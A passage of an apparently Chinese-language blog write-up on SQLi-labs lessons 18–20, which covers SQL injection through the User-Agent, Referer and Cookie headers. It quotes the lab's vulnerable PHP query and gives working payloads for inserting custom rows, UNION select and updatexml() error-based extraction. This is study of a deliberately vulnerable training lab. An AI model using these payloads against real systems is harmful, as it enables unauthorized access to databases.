+<p>这关开始的源代码写得有点意思，check_input函数没有啥变化，对uname和passwd做了处理，所以这两个参数没有了sql注入的可能性。</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926150620422.png" alt="1"></p>
+<p>这一关的前提是需要知道用户的账号和密码，可以通过前面的关卡注入出来，就不过多赘述。继续审代码，发现代码的逻辑是获取用户的IP和Uagent插入到表uagents中，且参数Uagent没有做任何处理，所以存在sql注入。</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926151040526.png" alt="注入语句"></p>
+<p>首先可以自定义插入数据: </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 111&#x27;, &#x27;127.0.0.1&#x27;, &#x27;hack&#x27;) #</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926152225184.png" alt="自定义插入数据"></p>
+<p>自定义插入数据那就是有机会进行二次注入，但是这一关是让我们直接使用报错注入来获取数据库的所有信息，所以需要另外想办法。</p>
+<p>这里直接在uagent变量后面比和单引号，然后拼接报错语句。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 1&#x27; and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) , 1, 1) #</span><br></pre></td></tr></table></figure>
+
+<p>这一关感觉就是教你如何在insert语句下使用报错注入，修改uagent之类的抓包修改都还比较简单。</p>
+<h1 id="Less-19-20"><a href="#Less-19-20" class="headerlink" title="Less-19/20"></a>Less-19/20</h1><p>Less-19：需要首先了解的知识<a target="_blank" rel="noopener" href="http://www.ruanyifeng.com/blog/2019/06/http-referer.html">Referer</a> （中文翻译叫引荐人）-&gt; HTTP 请求的头信息里面，<code>Referer</code> 是一个常见字段，提供访问来源的信息。</p>
+<p>其他感觉和18关差不多，都是insert语句报错注入，唯一的不同点就是修改的数据段为referer段，18关修改的是User-Agent段</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload: 1&#x27; and updatexml(1, concat(0x7e, (select version()), 0x7e), 1) ,1 ,1) #</span><br></pre></td></tr></table></figure>
+
+
+
+<p>Less-20：Cookie注入<img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926155252459.png" alt="Less-20"></p>
+<p>登录进去后会显示Cookie信息</p>
+<p>​    <img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926155525555.png" alt="Cookie Message"></p>
+<p>没啥思路，看源码学习</p>
+<p>首先还是对uname和passwd做了过滤，所有这两个参数不存在注入点，需要查找另外的注入点，通过一番抓包调试发现了注入点</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line">     <span class="variable">$sql</span>=<span class="string">&quot;SELECT * FROM users WHERE username=&#x27;<span class="subst">$cookee</span>&#x27; LIMIT 0,1&quot;</span>;</span><br><span class="line">                        <span class="variable">$result</span>=mysql_query(<span class="variable">$sql</span>);</span><br><span class="line">                        <span class="keyword">if</span> (!<span class="variable">$result</span>)</span><br><span class="line">                                &#123;</span><br><span class="line">                                <span class="keyword">die</span>(<span class="string">&#x27;Issue with your mysql: &#x27;</span> . mysql_error());</span><br><span class="line">                                &#125;</span><br><span class="line">                        <span class="variable">$row</span> = mysql_fetch_array(<span class="variable">$result</span>);</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$row</span>)</span><br><span class="line">                                &#123;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;pink&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;Your Login name:&#x27;</span>. <span class="variable">$row</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;&lt;font color= &quot;grey&quot; font size=&quot;5&quot;&gt;&#x27;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;Your Password:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&quot;&lt;/font&gt;&lt;/b&gt;&quot;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">                                <span class="keyword">echo</span> <span class="string">&#x27;Your ID:&#x27;</span> .<span class="variable">$row</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line">                                &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">测试payload: admin&#x27; and 1=2 union select 1,2,3 # </span><br></pre></td></tr></table></figure>
+
+<p>可以看到已经能够控制回显了，但是这关是要我们使用报错注入，所以方法没有对，使用报错注入来过关。</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926162206933.png" alt="注入测试"></p>
+<p>这里还有一个疑问，那就是有一个I LOVE COOKIE那个页面是怎么出来的也需要思考下。</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926162333601.png" alt="i love cookie"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">报错注入payload: admin&#x27; and updatexml(1, concat(0x7e,(select version()), 0x7e), 1) #</span><br></pre></td></tr></table></figure>
+
+<p>得到回显页面，其他的数据通过替换select version()语句得到其他信息。</p>
+<p><img src="https://raw.githubusercontent.com/f1shf1sh/Picture/master/Archlinux/image-20210926205850035.png" alt="报错注入得到回显"></p>
+<h1 id="Ending"><a href="#Ending" class="headerlink" title="Ending"></a>Ending</h1><p>SQLi-labs的基础关算是弄完了，但是有很多细节还没有深究，比如有很多关卡不止一种方式注入，还有很多的注入姿势没有学到，还要花时间研究研究。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">Fish</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="http://example.com/2/">http://example.com/2/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/3/"><img class="prev-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/37154/"><img class="next-cover" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/img/default.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">Next Post</div><div class="next_info">leetcode刷题记录-2</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" src="/img/%E7%8D%AD%E7%8D%AD.JPG" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">Fish</div><div class="author-info__description">binary</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">Tags</div><div class="length-num">11</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">Categories</div><div class="length-num">6</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/fish-snow"><i class="fab fa-github"></i><span>GitHub</span></a></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Catalog</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9C%80%E8%A6%81%E6%8E%8C%E6%8F%A1%E7%9A%84MySQL%E5%9F%BA%E6%9C%AC%E7%9F%A5%E8%AF%86"><span class="toc-number">1.</span> <span class="toc-text">需要掌握的MySQL基本知识</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-1-2"><span class="toc-number">2.</span> <span class="toc-text">Less-1&#x2F;2</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-3-4"><span class="toc-number">3.</span> <span class="toc-text">Less-3&#x2F;4</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-5-6"><span class="toc-number">4.</span> <span class="toc-text">Less-5&#x2F;6</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-7-8"><span class="toc-number">5.</span> <span class="toc-text">Less-7&#x2F;8</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-9-10"><span class="toc-number">6.</span> <span class="toc-text">Less-9&#x2F;10</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-11-12"><span class="toc-number">7.</span> <span class="toc-text">Less-11&#x2F;12</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-13-14"><span class="toc-number">8.</span> <span class="toc-text">Less-13&#x2F;14</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-15-16"><span class="toc-number">9.</span> <span class="toc-text">Less-15&#x2F;16</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-17-18"><span class="toc-number">10.</span> <span class="toc-text">Less-17&#x2F;18</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Less-19-20"><span class="toc-number">11.</span> <span class="toc-text">Less-19&#x2F;20</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Ending"><span class="toc-number">12.</span> <span class="toc-text">Ending</span></a></li></ol></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2022 By Fish</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="darkmode" type="button" title="Toggle Between Light And Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle between single-column and double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="Setting"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table Of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back To Top"><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script>var preloader = {
+  endLoading: () => {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loading-box').classList.add("loaded")
+  },
+  initLoading: () => {
+    document.body.style.overflow = '';
+    document.getElementById('loading-box').classList.remove("loaded")
+
+  }
+}
+window.addEventListener('load',preloader.endLoading())</script><div class="js-pjax"></div><script src="/js/fold2.js"></script><script defer="defer" id="fluttering_ribbon" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-fluttering-ribbon.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script></div></body></html>
